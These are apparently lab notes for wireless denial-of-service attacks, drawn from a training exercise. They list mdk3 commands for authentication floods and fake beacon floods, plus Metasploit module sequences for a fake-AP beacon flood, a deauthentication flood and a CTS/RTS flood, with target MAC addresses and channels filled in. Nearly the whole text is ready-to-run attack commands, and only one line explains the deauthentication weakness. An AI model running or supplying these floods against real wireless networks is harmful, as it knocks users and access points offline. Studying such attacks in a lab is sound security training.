authentication flood attack
#mdk3 mon0 a –a 90:94:e4:c8:04:e8 –m –c

fake beacon flood with random SSID
#mdk3 mon0 b –w –g –t –m –c 6

fake beacon flood with the selected SSID list
# mdk3 mon0 b –f labfiles/denial-of-service/SSID-FAKE –w –g –t –m –c 6

use Metasploit framework to generate fake beacon flood with random SSID
#msfconsole
	msf> use auxiliary/dos/wifi/fakeap
	msf> set CHANNEL 9
	msf> set NUM 1000
	msf> run

Metasploit deauthentication flood attack
	Since the deauthentication frames cannot be authenticated or
	verified for authenticity, the wireless clients and access
	point will accept them and disconnect from the network.
#msfconsole
	msf> use auxiliary/dos/wifi/deauth
	msf> set ADDR_BSS 90:94:e4:c8:04:e8
	msf> set ADDR_DST cc:b2:55:ff:2e:1c
	msf> set ADDR_SRC 90:94:e4:c8:04:e8
	msf> set CHANNEL 9
	msf> set NUM 100
	msf> run

The Metasploit CTS/RTS flood attack
#msfconsole
	msf> use auxiliary/dos/wifi/cts_rts_flood
	msf> set ADDR_DST 90:94:e4:c8:04:e8
	msf> set TYPE CTS
	msf> set NUM 10000
	msf> set CHANNEL 9
	msf> run
